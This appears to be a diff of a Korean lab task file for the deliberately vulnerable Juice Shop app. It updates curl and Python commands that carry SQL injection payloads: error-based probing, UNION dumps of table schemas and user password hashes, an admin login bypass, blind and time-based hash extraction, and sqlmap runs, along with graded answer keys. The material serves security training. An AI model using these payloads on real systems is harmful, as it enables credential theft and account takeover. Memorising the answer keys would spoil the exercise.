@@ -42,16 +42,16 @@ steps:
     ```bash
     # 1. 정상 query (baseline)
     echo "=== 1. 정상 query (q=apple) ==="
-    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -15
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple" | head -15
 
     # 2. SQL 메타문자 (1회 quote)
     echo ""
     echo "=== 2. q=apple' (작은따옴표 1 회) ==="
-    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple%27" | head -20
 
     # 3. 다른 메타문자 (이중 quote / 백슬래시 / 주석)
     for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
-      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=${inj}")
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/rest/products/search?q=${inj}")
       echo "q=${inj} → ${code}"
     done
     ```
@@ -96,15 +96,15 @@ steps:
   points: 10
   answer: |
     echo "=== 1. 정상 query (baseline) ==="
-    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -10
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple" | head -10
     echo ""
     echo "=== 2. q=apple' (작은따옴표) → SQL 에러 노출 ==="
-    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple%27" | head -20
     echo ""
     echo "=== 3. 4 메타문자 변형 응답 코드 ==="
     for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
       code=$(curl -o /dev/null -s -w "%{http_code}" \
-        "http://10.20.40.81:3000/rest/products/search?q=${inj}")
+        "http://juice.6v6.lab/rest/products/search?q=${inj}")
       echo "q=${inj} → ${code}"
     done
   answer_detail: |
@@ -138,10 +138,10 @@ steps:
         - DB 종류 식별 시도 안 함
   target_vm: attacker
   script: |
-    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -10
-    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple" | head -10
+    curl -s -i "http://juice.6v6.lab/rest/products/search?q=apple%27" | head -20
     for inj in "apple%22" "apple--" "apple%23"; do
-      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=${inj}")
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/rest/products/search?q=${inj}")
       echo "q=${inj} → ${code}"
     done
   risk_level: low
@@ -170,13 +170,13 @@ steps:
     ```bash
     # 1. SQLite 버전 추출 (CAST 에러 활용)
     echo "=== 1. SQLite version ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20CAST(sqlite_version()%20AS%20INT)--" \
       | head -10
 
     # 2. schema 직접 (sqlite_master 의 sql 컬럼)
     echo ""
     echo "=== 2. sqlite_master schema ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--" \
       | python3 -c "import sys,json; d=json.load(sys.stdin); [print(p) for p in d.get('data',[])[:5]]" 2>/dev/null \
       || echo "(JSON parse fail — raw 응답)"
 
@@ -185,14 +185,14 @@ steps:
     echo "=== 3. ORDER BY 컬럼 수 추정 ==="
     for n in 1 5 9 10 15; do
       code=$(curl -o /dev/null -s -w "%{http_code}" \
-        "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
+        "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20ORDER%20BY%20${n}--")
       echo "ORDER BY ${n} → ${code}"
     done
 
     # 4. table list (sqlite_master 의 name 컬럼)
     echo ""
     echo "=== 4. 모든 테이블 list ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
       | python3 -c "import sys,json; d=json.load(sys.stdin); [print(' table:', p.get('id', p)) for p in d.get('data',[])[:10]]" 2>/dev/null
     ```
 
@@ -235,17 +235,17 @@ steps:
   points: 12
   answer: |
     echo "=== 1. SQLite version (CAST 에러) ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
     echo ""
     echo "=== 2. ORDER BY 컬럼 수 추정 ==="
     for n in 1 5 9 10 15; do
       code=$(curl -o /dev/null -s -w "%{http_code}" \
-        "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
+        "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20ORDER%20BY%20${n}--")
       echo "ORDER BY ${n} → ${code}"
     done
     echo ""
     echo "=== 3. sqlite_master 의 모든 테이블 list ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
       | head -20
   answer_detail: |
     Juice Shop SQLite default schema = Users (8 컬럼 — id/email/password/role/
@@ -278,12 +278,12 @@ steps:
         - DB 종류 식별 (SQLite vs MySQL) 누락
   target_vm: attacker
   script: |
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
     for n in 1 5 9 10 15; do
-      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20ORDER%20BY%20${n}--")
       echo "ORDER BY ${n} → ${code}"
     done
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
   risk_level: low
   bastion_prompt: |
     attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
@@ -309,21 +309,21 @@ steps:
     ```bash
     # 1. 기본 ' OR 1=1-- (admin 이 첫 row 일 때만)
     echo "=== 1. ' OR 1=1-- ==="
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"' OR 1=1--\",\"password\":\"anything\"}" | head -15
 
     # 2. admin email 명시 + 주석 처리 (password 검증 skip)
     echo ""
     echo "=== 2. admin@juice-sh.op'-- ==="
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
 
     # 3. JWT 토큰 추출 (admin 로그인 성공 시)
     echo ""
     echo "=== 3. JWT 토큰 + role 확인 ==="
-    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
       | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
@@ -378,12 +378,12 @@ steps:
   points: 12
   answer: |
     echo "=== 1. admin@juice-sh.op'-- 인증 우회 ==="
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
     echo ""
     echo "=== 2. JWT 토큰 추출 ==="
-    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
       | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
@@ -426,10 +426,10 @@ steps:
         - role 직접 확인 누락
   target_vm: attacker
   script: |
-    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
-    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
       -H 'Content-Type: application/json' \
       -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
       | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
@@ -463,19 +463,19 @@ steps:
     ```bash
     # 1. CREATE TABLE SQL 전체 (sqlite_master 의 sql 컬럼)
     echo "=== 1. 전체 schema dump ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
       | python3 -c "import sys,json; d=json.load(sys.stdin); [print('---') or print(p.get('id',p)) for p in d.get('data',[])[:5]]" 2>/dev/null
 
     # 2. Users 테이블 만 (특정 테이블 schema)
     echo ""
     echo "=== 2. Users 테이블 schema ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27--" \
       | head -20
 
     # 3. PRAGMA 활용 (table_info 로 컬럼 list)
     echo ""
     echo "=== 3. PRAGMA table_info(Users) ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" \
       | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'  {p.get(\"id\")}: {p.get(\"name\")}') for p in d.get('data',[])[:15]]" 2>/dev/null
     ```
 
@@ -519,13 +519,13 @@ steps:
   points: 15
   answer: |
     echo "=== 1. 전체 schema dump (sqlite_master) ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
     echo ""
     echo "=== 2. Users 테이블 schema 만 ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27--" | head -10
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27--" | head -10
     echo ""
     echo "=== 3. PRAGMA table_info(Users) — 컬럼 list ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
   answer_detail: |
     Juice Shop 의 Users schema = (id, username, email, password, role, deluxeToken,
     lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt).
@@ -557,8 +557,8 @@ steps:
         - 컬럼 수 매핑 (9 컬럼) 설명 누락
   target_vm: attacker
   script: |
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
   risk_level: low
   bastion_prompt: |
     attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
@@ -584,19 +584,19 @@ steps:
     ```bash
     # 1. Users 전체 dump (email + password)
     echo "=== 1. Users 전체 dump ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" \
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" \
       | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'  {p.get(\"id\",\"\"):30s} | {p.get(\"name\",\"\")}') for p in d.get('data',[])[:15]]" 2>/dev/null \
-      || curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
+      || curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
 
     # 2. admin role 만 필터
     echo ""
     echo "=== 2. admin role 만 ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,role,4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -15
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,role,4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -15
 
     # 3. hash 형식 식별 (한 hash 의 길이 + prefix 패턴)
     echo ""
     echo "=== 3. hash 형식 ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20LIMIT%201--" | head -10
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20LIMIT%201--" | head -10
     ```
 
     ## 📋 확인 사항
@@ -642,10 +642,10 @@ steps:
   points: 15
   answer: |
     echo "=== 1. Users 전체 dump (email + password hash) ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
     echo ""
     echo "=== 2. admin role 만 + hash 형식 ==="
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
   answer_detail: |
     Juice Shop default Users dump = admin@juice-sh.op + 0192023a7bbd73250516f069df18b500
     (MD5 = admin123). 21 row 의 default user — admin / jim@juice-sh.op /
@@ -677,8 +677,8 @@ steps:
         - hash 형식 (MD5/bcrypt) 식별 누락
   target_vm: attacker
   script: |
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
-    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
   risk_level: low
   bastion_prompt: |
     attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
@@ -705,8 +705,8 @@ steps:
     ```bash
     # 1. 참 vs 거짓 baseline (응답 본문 길이 차이)
     echo "=== 1. 참/거짓 baseline ==="
-    LEN_TRUE=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%201=1--" | wc -c)
-    LEN_FALSE=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%201=2--" | wc -c)
+    LEN_TRUE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=1--" | wc -c)
+    LEN_FALSE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=2--" | wc -c)
     echo "1=1 → len=${LEN_TRUE}, 1=2 → len=${LEN_FALSE}"
     echo "차이: $((LEN_TRUE - LEN_FALSE)) bytes"
 
@@ -714,8 +714,8 @@ steps:
     echo ""
     echo "=== 2. admin password hash[1] 식별 ==="
     for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
-      payload="test%27%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
-      len=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=${payload}" | wc -c)
+      payload="qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
+      len=$(curl -s "http://juice.6v6.lab/rest/products/search?q=${payload}" | wc -c)
       [ "$len" = "$LEN_TRUE" ] && echo "  hash[1]='${c}' (응답 len ${LEN_TRUE} = TRUE)"
     done
 
@@ -724,12 +724,12 @@ steps:
     echo "=== 3. 자동 binary search (첫 5 자) ==="
     python3 <<'PYEOF'
     import urllib.request
-    BASE = "http://10.20.40.81:3000/rest/products/search?q="
-    LEN_TRUE = len(urllib.request.urlopen(BASE + "test%27%20AND%201=1--").read())
+    BASE = "http://juice.6v6.lab/rest/products/search?q="
+    LEN_TRUE = len(urllib.request.urlopen(BASE + "qwert%27))%20AND%201=1--").read())
     extracted = ""
     for pos in range(1, 6):
         for c in "0123456789abcdef":
-            payload = f"test%27%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),{pos},1)=%27{c}%27--"
+            payload = f"qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),{pos},1)=%27{c}%27--"
             n = len(urllib.request.urlopen(BASE + payload).read())
             if n == LEN_TRUE:
                 extracted += c
@@ -778,14 +778,14 @@ steps:
   points: 12
   answer: |
     echo "=== 1. 참/거짓 baseline ==="
-    LEN_TRUE=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%201=1--" | wc -c)
-    LEN_FALSE=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%201=2--" | wc -c)
+    LEN_TRUE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=1--" | wc -c)
+    LEN_FALSE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=2--" | wc -c)
     echo "1=1 → ${LEN_TRUE} bytes, 1=2 → ${LEN_FALSE} bytes (차이: $((LEN_TRUE - LEN_FALSE)))"
     echo ""
     echo "=== 2. admin password hash 첫 글자 식별 ==="
     for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
-      payload="test%27%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
-      len=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=${payload}" | wc -c)
+      payload="qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
+      len=$(curl -s "http://juice.6v6.lab/rest/products/search?q=${payload}" | wc -c)
       [ "$len" = "$LEN_TRUE" ] && echo "hash[1]='${c}' (TRUE)"
     done
   answer_detail: |
@@ -818,12 +818,12 @@ steps:
         - sqlmap 또는 자동화 도구 미언급
   target_vm: attacker
   script: |
-    LEN_TRUE=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%201=1--" | wc -c)
-    LEN_FALSE=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%201=2--" | wc -c)
+    LEN_TRUE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=1--" | wc -c)
+    LEN_FALSE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=2--" | wc -c)
     echo "1=1 → ${LEN_TRUE}, 1=2 → ${LEN_FALSE} (diff=$((LEN_TRUE - LEN_FALSE)))"
     for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
-      payload="test%27%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
-      len=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=${payload}" | wc -c)
+      payload="qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
+      len=$(curl -s "http://juice.6v6.lab/rest/products/search?q=${payload}" | wc -c)
       [ "$len" = "$LEN_TRUE" ] && echo "hash[1]='${c}' TRUE"
     done
   risk_level: low
@@ -849,19 +849,19 @@ steps:
     ```bash
     # 1. baseline (조건 거짓 — 즉시 응답)
     echo "=== 1. 거짓 baseline (RANDOMBLOB 안 실행) ==="
-    time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
 
     # 2. 조건 참 (RANDOMBLOB 100MB 실행 — 응답 지연)
     echo ""
     echo "=== 2. 참 조건 (RANDOMBLOB 100MB 실행) ==="
-    time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
 
     # 3. password hash 첫 글자 추출 (Time-based)
     echo ""
     echo "=== 3. admin hash[1] 식별 (응답 시간 기반) ==="
     for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
-      payload="test%27%20AND%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27%20THEN%20RANDOMBLOB(50000000)%20ELSE%201%20END)--"
-      ms=$(curl -s -o /dev/null -w "%{time_total}" "http://10.20.40.81:3000/rest/products/search?q=${payload}")
+      payload="qwert%27))%20AND%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27%20THEN%20RANDOMBLOB(50000000)%20ELSE%201%20END)--"
+      ms=$(curl -s -o /dev/null -w "%{time_total}" "http://juice.6v6.lab/rest/products/search?q=${payload}")
       # 응답 시간 0.5초 이상이면 TRUE
       awk -v t="$ms" -v c="$c" 'BEGIN { if (t+0 > 0.5) print "  hash[1]=" c " (time=" t ")" }'
     done
@@ -910,15 +910,15 @@ steps:
   points: 12
   answer: |
     echo "=== 1. 거짓 baseline (즉시) ==="
-    time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
     echo ""
     echo "=== 2. 참 조건 (RANDOMBLOB 100MB) ==="
-    time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
     echo ""
     echo "=== 3. admin hash[1] 식별 (Time-based) ==="
     for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
-      payload="test%27%20AND%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27%20THEN%20RANDOMBLOB(50000000)%20ELSE%201%20END)--"
-      ms=$(curl -s -o /dev/null -w "%{time_total}" "http://10.20.40.81:3000/rest/products/search?q=${payload}")
+      payload="qwert%27))%20AND%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27%20THEN%20RANDOMBLOB(50000000)%20ELSE%201%20END)--"
+      ms=$(curl -s -o /dev/null -w "%{time_total}" "http://juice.6v6.lab/rest/products/search?q=${payload}")
       awk -v t="$ms" -v c="$c" 'BEGIN { if (t+0 > 0.5) print "hash[1]=" c " (time=" t ")" }'
     done
   answer_detail: |
@@ -951,8 +951,8 @@ steps:
         - Boolean 과 차이 (응답 sanitize bypass) 설명 누락
   target_vm: attacker
   script: |
-    time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
-    time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
   risk_level: low
   bastion_prompt: |
     attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
@@ -978,28 +978,28 @@ steps:
     ```bash
     # 1. 기본 탐지 (--batch = 비대화형, level/risk 기본)
     echo "=== 1. 기본 탐지 (level 1, risk 1) ==="
-    sqlmap -u 'http://10.20.40.81:3000/rest/products/search?q=test' \
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
       --batch --level=1 --risk=1 2>&1 | tail -25
 
